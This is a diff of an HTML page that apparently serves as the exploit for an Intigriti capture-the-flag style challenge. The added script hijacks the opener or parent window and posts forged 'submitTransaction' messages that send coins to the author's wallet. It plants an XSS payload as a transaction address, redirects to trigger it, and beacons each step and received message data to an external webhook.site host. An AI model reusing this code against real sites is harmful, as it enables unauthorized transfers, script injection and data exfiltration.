@@ -1,88 +1,120 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti 0126 - Debug Iframe</title>
+    <title>Intigriti 0126 - Exploit</title>
     <meta charset="UTF-8">
-    <style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}iframe{width:800px;height:600px;border:2px solid #00ff00;}</style>
 </head>
 <body>
-    <h1>DEBUG - Visible Iframe</h1>
-    <div id="log">Loading checkout...</div>
-    <iframe id="checkoutFrame" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1"></iframe>
-
     <script>
         const WEBHOOK = 'https://webhook.site/a0c5dc4c-1b40-463c-95b6-64ea3c45809c';
         const YOUR_WALLET = '1cffcc33e631193cce307bda88be77345e';
         const BASE = 'https://challenge-0126.intigriti.io';
+        const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';
 
-        function log(msg) {
-            document.getElementById('log').innerHTML += '<br>' + msg;
-            console.log(msg);
-        }
-
+        // Track everything
         function track(step, status, data = {}) {
-            fetch(`${WEBHOOK}?step=${step}&status=${status}&ts=${Date.now()}&d=${encodeURIComponent(JSON.stringify(data))}`, { mode: 'no-cors' }).catch(() => {});
+            new Image().src = `${WEBHOOK}?step=${step}&status=${status}&ts=${Date.now()}&d=${encodeURIComponent(JSON.stringify(data))}`;
+            console.log(step, status, data);
         }
 
-        track('start', 'loaded', {});
+        track('start', 'loaded', { location: window.location.href });
 
-        const iframe = document.getElementById('checkoutFrame');
+        // STRATEGY 1: If bot opened us as popup/iframe, use window.opener or window.parent
+        if (window.opener && !window.opener.closed) {
+            track('found_opener', 'success', {});
 
-        // Try multiple times to send postMessage
-        const delays = [3000, 5000, 7000, 10000, 15000];
+            // Redirect opener to checkout
+            window.opener.location = `${BASE}/checkout.html?currency=1337COIN&price=1`;
 
-        delays.forEach((delay, index) => {
+            // Wait for checkout to load, then send postMessage
             setTimeout(() => {
-                log(`Attempt ${index + 1} (${delay}ms): Sending postMessage...`);
-                track(`attempt_${index+1}`, 'sending', { delay });
+                track('sending_to_opener', 'start', {});
 
-                try {
-                    iframe.contentWindow.postMessage({
-                        type: 'submitTransaction',
-                        transaction: {
-                            toAddress: YOUR_WALLET,
-                            currency: '1337COIN',
-                            amount: 1
-                        }
-                    }, '*');
+                window.opener.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: YOUR_WALLET,
+                        currency: '1337COIN',
+                        amount: 1337
+                    }
+                }, '*');
 
-                    track(`sent_${index+1}`, 'success', { delay });
-                    log(`  → postMessage sent at ${delay}ms`);
-                } catch (e) {
-                    track(`error_${index+1}`, 'failed', { error: e.message, delay });
-                    log(`  → Error: ${e.message}`);
-                }
-            }, delay);
-        });
+                track('tx1_sent', 'done', {});
 
-        // Listen for responses
-        window.addEventListener('message', (event) => {
-            log(`[RECEIVED] ${JSON.stringify(event.data).substring(0, 150)}`);
-            track('msg_received', 'info', {
-                data: JSON.stringify(event.data).substring(0, 200),
-                origin: event.origin
-            });
-        });
+                window.opener.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: XSS_PAYLOAD,
+                        currency: '1337COIN',
+                        amount: 1337
+                    }
+                }, '*');
 
-        // Check iframe status periodically
-        setInterval(() => {
+                track('tx2_sent', 'done', {});
+
+                // Redirect to marketwatch to trigger XSS
+                setTimeout(() => {
+                    window.opener.location = `${BASE}/marketwatch.html`;
+                    track('redirected', 'done', {});
+                }, 3000);
+            }, 8000);
+        }
+        // STRATEGY 2: window.parent (iframe case)
+        else if (window.parent && window.parent !== window) {
+            track('found_parent', 'success', {});
+
+            window.parent.location = `${BASE}/checkout.html?currency=1337COIN&price=1`;
+
+            setTimeout(() => {
+                track('sending_to_parent', 'start', {});
+
+                window.parent.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: YOUR_WALLET,
+                        currency: '1337COIN',
+                        amount: 1337
+                    }
+                }, '*');
+
+                track('tx1_sent', 'done', {});
+
+                window.parent.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: XSS_PAYLOAD,
+                        currency: '1337COIN',
+                        amount: 1337
+                    }
+                }, '*');
+
+                track('tx2_sent', 'done', {});
+
+                setTimeout(() => {
+                    window.parent.location = `${BASE}/marketwatch.html`;
+                    track('redirected', 'done', {});
+                }, 3000);
+            }, 8000);
+        }
+        // STRATEGY 3: No opener/parent - try redirecting this tab
+        else {
+            track('no_opener_parent', 'redirecting_self', {});
+
+            // Store data in localStorage
             try {
-                // This will fail due to cross-origin, but tells us if iframe is still there
-                const loc = iframe.contentWindow.location.href;
-                log(`Iframe URL: ${loc.substring(0, 50)}...`);
-            } catch(e) {
-                // Expected - cross-origin
-                log('Iframe is loaded (cross-origin)');
-            }
-        }, 5000);
+                localStorage.setItem('exploit_wallet', YOUR_WALLET);
+                localStorage.setItem('exploit_xss', XSS_PAYLOAD);
+                localStorage.setItem('exploit_webhook', WEBHOOK);
+            } catch(e) {}
 
-        // Final summary
-        setTimeout(() => {
-            log('=== SUMMARY ===');
-            log('If you see NO "msg_received" events above, checkout never responded.');
-            log('This means checkout either: redirected, no session, or event handler not attached.');
-            track('summary', 'done', {});
-        }, 20000);
+            // Redirect to a page that will execute our exploit
+            window.location.href = `${BASE}/checkout.html?currency=1337COIN&price=1&exploit=1`;
+        }
+
+        // Listen for messages
+        window.addEventListener('message', (event) => {
+            track('msg_received', 'info', event.data);
+        });
     </script>
 </body>
 </html>
